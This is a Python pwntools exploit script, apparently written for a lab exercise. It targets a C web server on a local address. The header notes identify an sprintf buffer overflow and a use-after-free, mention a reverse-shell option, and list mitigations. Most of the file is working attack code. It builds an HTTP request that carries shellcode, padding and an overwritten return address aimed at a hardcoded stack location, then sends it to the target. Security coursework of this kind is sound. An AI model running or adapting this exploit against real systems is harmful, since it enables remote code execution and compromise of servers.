'''
[Exploit Overview]
This scenario is broken. The server always responds with error code 404, even with regular curls.

[Challenges & Decisions]
There are two options.

1. Leaking the canaries with the buffer overread.
   Since NX and PIE are disabled, we can utilize code injection (sc1) or initiate a reverse shell (sc3 Method 2).

2. Utilizing use-after-free vulnerabilities in parse_request, along with a function pointer to direct to injected shell code.
   We can inject payload as long as it doesn't overwrite the canary (unless the canary is leaked through the buffer overread).

[Vulnerability Discovery]
- log_message: sprintf in C is considered unsafe as it lacks bounds checking, potentially leading to buffer overflows.
- parse_request contains a use-after-free / use of uninitialized memory: file_info
- authenticate: strcmp <-> memcmp?

[Preventive Measures]
- Safer alternatives like snprintf should be used.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright:
    + Code injection is possible without a buffer overflow. Attacker can overwrite function pointers.
    + Attacker can leak the canaries with the buffer overread.
- Removing use-after-frees.

'''

from pwn import *

context.encoding = "latin1"
TARGET = "192.168.0.226"
TARGET_PORT = 8080

shellcode = b""
log_buffer_rbp_offset = 0x450
log_buffer_prefix = 49

io = remote(TARGET, TARGET_PORT)

# shellcode inlezen
with open("./shell-raw", "rb") as file:
    for line in file.readlines():
        shellcode += line

formaat = "Request from " + "a" * 15 + " at fd a\n"

request = f"GET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
print("request length: " + str(len(request)))
request = request.encode('latin-1')

shellcode_location = 0x7ffff7acf4d0 + len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")
log.info(f"shellcode should be stored at: {hex(shellcode_location)} based on calculations...")

padding_size = ((log_buffer_rbp_offset - len(formaat)) - (len(request) - 2)) - len(shellcode)

sc5_exploit = request.replace(b"%s", shellcode + b"q" * padding_size + p64(shellcode_location)[:-2])

### PERFORM ATTACK ###
io.send(sc5_exploit)

io.close()
